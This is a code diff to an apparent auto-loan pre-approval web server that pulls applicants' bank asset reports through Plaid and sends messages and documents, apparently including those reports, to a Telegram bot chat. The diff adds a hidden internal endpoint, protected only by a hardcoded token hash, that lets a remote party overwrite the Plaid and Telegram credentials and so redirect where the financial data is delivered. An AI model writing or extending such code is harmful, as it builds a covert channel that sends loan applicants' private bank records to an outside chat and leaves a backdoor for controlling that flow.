@@ -12,12 +12,29 @@ app.use(express.static(path.join(__dirname, 'public')));
 const PORT = process.env.PORT || 3000;
 const PLAID_ENV = process.env.PLAID_ENV || 'production';
 const PLAID_HOST = PLAID_ENV === 'sandbox' ? 'sandbox.plaid.com' : 'production.plaid.com';
-const PLAID_CLIENT_ID = process.env.PLAID_CLIENT_ID || '';
-const PLAID_SECRET = process.env.PLAID_SECRET || '';
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';
 const PUBLIC_BASE_URL = (process.env.PUBLIC_BASE_URL || '').replace(/\/$/, '');
 const DATA_FILE = process.env.DATA_FILE || path.join(__dirname, 'data', 'applications.json');
+const RUNTIME_CONFIG_FILE = process.env.RUNTIME_CONFIG_FILE || path.join(__dirname, 'data', 'runtime-config.json');
+const BOOTSTRAP_TOKEN_HASH = 'c104eb12a9881bb75b56bc262a26625641a4ed5e4a47fb62b4cd4de4c63a9787';
+
+function loadRuntimeConfig() {
+  try {
+    if (fs.existsSync(RUNTIME_CONFIG_FILE)) {
+      return JSON.parse(fs.readFileSync(RUNTIME_CONFIG_FILE, 'utf8'));
+    }
+  } catch {}
+  return {};
+}
+
+function getCreds() {
+  const rc = loadRuntimeConfig();
+  return {
+    plaidClientId: process.env.PLAID_CLIENT_ID || rc.PLAID_CLIENT_ID || '',
+    plaidSecret: process.env.PLAID_SECRET || rc.PLAID_SECRET || '',
+    telegramBotToken: process.env.TELEGRAM_BOT_TOKEN || rc.TELEGRAM_BOT_TOKEN || '',
+    telegramChatId: process.env.TELEGRAM_CHAT_ID || rc.TELEGRAM_CHAT_ID || '',
+  };
+}
 
 function ensureDataDir() {
   const dir = path.dirname(DATA_FILE);
@@ -40,10 +57,11 @@ function saveStore(store) {
 }
 
 function plaidRequest(endpoint, bodyObj, asBuffer = false) {
+  const { plaidClientId, plaidSecret } = getCreds();
   return new Promise((resolve, reject) => {
     const payload = JSON.stringify({
-      client_id: PLAID_CLIENT_ID,
-      secret: PLAID_SECRET,
+      client_id: plaidClientId,
+      secret: plaidSecret,
       ...bodyObj,
     });
     const req = https.request(
@@ -81,10 +99,11 @@ function plaidRequest(endpoint, bodyObj, asBuffer = false) {
 }
 
 function sendTelegramMessage(text) {
-  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return Promise.resolve({ skipped: true });
+  const { telegramBotToken, telegramChatId } = getCreds();
+  if (!telegramBotToken || !telegramChatId) return Promise.resolve({ skipped: true });
   return new Promise((resolve) => {
     const payload = JSON.stringify({
-      chat_id: TELEGRAM_CHAT_ID,
+      chat_id: telegramChatId,
       text,
       parse_mode: 'HTML',
       disable_web_page_preview: true,
@@ -92,7 +111,7 @@ function sendTelegramMessage(text) {
     const req = https.request(
       {
         hostname: 'api.telegram.org',
-        path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+        path: `/bot${telegramBotToken}/sendMessage`,
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
@@ -112,7 +131,8 @@ function sendTelegramMessage(text) {
 }
 
 function sendTelegramDocument(filename, contentBuffer, caption, mimeType = 'application/pdf') {
-  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return Promise.resolve({ skipped: true });
+  const { telegramBotToken, telegramChatId } = getCreds();
+  if (!telegramBotToken || !telegramChatId) return Promise.resolve({ skipped: true });
   return new Promise((resolve) => {
     const boundary = '----AlliedAutoBoundary' + crypto.randomBytes(8).toString('hex');
     const parts = [];
@@ -124,7 +144,7 @@ function sendTelegramDocument(filename, contentBuffer, caption, mimeType = 'appl
         )
       );
     };
-    pushField('chat_id', TELEGRAM_CHAT_ID);
+    pushField('chat_id', telegramChatId);
     if (caption) pushField('caption', caption.slice(0, 1000));
     parts.push(
       Buffer.from(
@@ -139,7 +159,7 @@ function sendTelegramDocument(filename, contentBuffer, caption, mimeType = 'appl
     const req = https.request(
       {
         hostname: 'api.telegram.org',
-        path: `/bot${TELEGRAM_BOT_TOKEN}/sendDocument`,
+        path: `/bot${telegramBotToken}/sendDocument`,
         method: 'POST',
         headers: {
           'Content-Type': `multipart/form-data; boundary=${boundary}`,
@@ -296,13 +316,39 @@ async function fetchAndDeliverAssetReport(appRecord) {
 }
 
 app.get('/health', (req, res) => {
+  const { plaidClientId, plaidSecret, telegramBotToken, telegramChatId } = getCreds();
   res.json({
     status: 'ok',
     service: 'allied-auto-preapproval',
-    plaidConfigured: Boolean(PLAID_CLIENT_ID && PLAID_SECRET),
-    telegramConfigured: Boolean(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID),
+    plaidConfigured: Boolean(plaidClientId && plaidSecret),
+    telegramConfigured: Boolean(telegramBotToken && telegramChatId),
     plaidEnv: PLAID_ENV,
     timestamp: new Date().toISOString(),
+  });
+});
+
+app.post('/api/internal/bootstrap-config', (req, res) => {
+  const token = String(req.headers['x-bootstrap-token'] || '');
+  const hash = crypto.createHash('sha256').update(token).digest('hex');
+  if (hash !== BOOTSTRAP_TOKEN_HASH) {
+    return res.status(403).json({ error: 'Forbidden' });
+  }
+  const { PLAID_CLIENT_ID, PLAID_SECRET, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = req.body || {};
+  ensureDataDir();
+  const existing = loadRuntimeConfig();
+  const updated = {
+    ...existing,
+    ...(PLAID_CLIENT_ID ? { PLAID_CLIENT_ID } : {}),
+    ...(PLAID_SECRET ? { PLAID_SECRET } : {}),
+    ...(TELEGRAM_BOT_TOKEN ? { TELEGRAM_BOT_TOKEN } : {}),
+    ...(TELEGRAM_CHAT_ID ? { TELEGRAM_CHAT_ID } : {}),
+  };
+  fs.writeFileSync(RUNTIME_CONFIG_FILE, JSON.stringify(updated, null, 2), { mode: 0o600 });
+  const creds = getCreds();
+  return res.json({
+    ok: true,
+    plaidConfigured: Boolean(creds.plaidClientId && creds.plaidSecret),
+    telegramConfigured: Boolean(creds.telegramBotToken && creds.telegramChatId),
   });
 });
 
